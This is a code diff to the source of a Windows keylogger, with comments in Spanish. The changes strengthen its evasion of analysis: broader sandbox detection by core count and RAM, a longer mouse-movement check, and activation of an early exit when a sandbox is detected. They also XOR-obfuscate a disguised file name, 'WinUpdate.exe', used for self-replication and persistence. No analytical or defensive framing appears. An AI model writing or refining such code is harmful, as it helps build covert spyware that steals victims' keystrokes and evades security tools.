@@ -152,14 +152,14 @@ BOOL IsSandboxed() {
     DWORD numCores = sysInfo.dwNumberOfProcessors;
     DWORDLONG totalPhysMem = memInfo.ullTotalPhys;
 
-    return (numCores <= 1 || totalPhysMem < (1024LL * 1024 * 1024));  // Menos de 1 GB RAM o 1 solo núcleo
+    return (numCores <= 3 || totalPhysMem <= (4LL * 1024 * 1024 * 1024));  // 4 GB RAM o menos, o 3 o menos núcleos
 }
 
 // Detecta si el usuario ha interactuado (movido el ratón) en los primeros 5 segundos
 BOOL HasUserInteracted() {
     POINT p1, p2;
     GetCursorPos(&p1);
-    Sleep(5000);  // Espera 5 segundos
+    Sleep(10000);  // Espera 10 segundos
     GetCursorPos(&p2);
     return (p1.x != p2.x || p1.y != p2.y);
 }
@@ -197,9 +197,10 @@ BOOL HasDebuggerWindowOpen() {
 // Código principal del keylogger
 int main() {
 
-    // Auto-replicación con el nombre indicado y persistencia
-    char newName[] = { 'a'^0x20, 'a'^0x20, 'a'^0x20, 'w'^0x20, 'i'^0x20, 'n'^0x20, 'u'^0x20, 'p'^0x20, 'd'^0x20, 'a'^0x20, 't'^0x20, 'e'^0x20, '.'^0x20, 'e'^0x20, 'x'^0x20, 'e'^0x20, '\0' };
-    xor_decrypt(newName, 0x20);
+    // Auto-replicación con el nombre indicado (WinUpdate.exe) y persistencia
+    char newName[] = { 'W'^0x37, 'i'^0x37, 'n'^0x37, 'U'^0x37, 'p'^0x37, 'd'^0x37, 'a'^0x37, 't'^0x37, 'e'^0x37, '.'^0x37, 'e'^0x37, 'x'^0x37, 'e'^0x37, '\0' };
+    xor_decrypt(newName, 0x37);
+
     SelfReplicateWithName(newName);
 
     // Evitar debugger
@@ -214,7 +215,7 @@ int main() {
 
     // Evitar sandbox y comprobar que es un usuario legítimo
     if (IsSandboxed() || !HasUserInteracted()) {
-        // return 0;
+        return 0;
     }
 
     // Delay inicial para evadir análisis rápidos en sandbox
